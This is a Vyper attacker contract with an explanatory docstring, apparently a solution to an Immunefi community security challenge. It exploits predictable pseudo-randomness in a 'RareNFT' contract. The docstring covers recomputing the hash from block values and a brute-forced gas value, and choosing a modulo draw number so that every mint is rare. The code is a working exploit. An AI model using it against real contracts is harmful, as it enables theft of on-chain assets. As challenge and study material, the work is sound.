# @version ^0.3.7

"""
The vulnerability is in the `_randGenerator()` function of the 
RareNFT contract. None of the values in the function are truly 
random and can therefore be mimicked in an attacker contract 
exactly. The part proved to be the most tedious was the gasleft()
function. In order to figure out the exact amount gasleft() returned 
I did a brute force approach. I modified the RareNFT contract to emit 
events for gasleft() before and after the randHash value was computed.
From there I knew that the gasleft() function in the randHash value will 
have to return a gas value between the values from the emitted events. So
I wrote a simply script to run my POC with each gas value and saw which one 
worked. This is probably not the most elegant approach, but it got the job 
done. The other part of the exploit was figuring out a way to have the 
`_randGenerator()` function always return the value of the lucky_val.
We could solve this part by understanding the modulo operator. Specifically
that this equation holds true: x % (x - y) = y. In our case x is the randHash,
which we now know how to compute with the specific gas. In the RareNFT contract 
the random number is computed like so: randHash % _drawNum = random. And we want 
randHash % _drawNum = lucky_val. We know randHash and we know lucky_val, and we 
want to find out which _drawNum we need to pass to the function. We can rewrite
that simple equation in the form of the modulo equation I wrote out above: 
randHash % (randHash - lucky_val) = lucky_val. The num we need to pass to the `mint()`
function to always mint a rare NFT is (randHash - lucky_val). Shoutout to zpano for 
his original POC which I took inspiration from. It was quite a challenge to reimplement. 
https://github.com/immunefi-team/community-challenges/blob/master/contracts/malicious/RareNFTAttack.sol
"""

owner: immutable(address)

rare: address

@external
@payable
def __init__(_rare: address):
    assert msg.value >= as_wei_value(1, "ether"), "send 1 ETH"
    owner = msg.sender
    self.rare = _rare

@external
def attack(lucky_val: uint256, nonce: uint256, gas_val: uint256):
    assert msg.sender == owner, "!owner"
    random: uint256 = self._rand_generator(nonce, gas_val)
    draw_num: uint256 = random - lucky_val
    raw_call(
        self.rare,
        _abi_encode(
            draw_num, 
            method_id=method_id("mint(uint256)"),
        ),
        value=as_wei_value(1, "ether"),
    )

@internal
def _rand_generator(nonce: uint256, gas_val: uint256) -> uint256:
    rand_hash: bytes32 = keccak256(
        concat(
            block.prevhash,
            convert(block.timestamp, bytes32),
            slice(convert(block.coinbase, bytes32), 12, 20),
            convert(gas_val, bytes32),
            convert(tx.gasprice, bytes32),
            slice(convert(tx.origin, bytes32), 12, 20),
            convert(nonce, bytes32),
            slice(convert(self, bytes32), 12, 20),
        )
    )
    random: uint256 = convert(rand_hash, uint256)
    return random
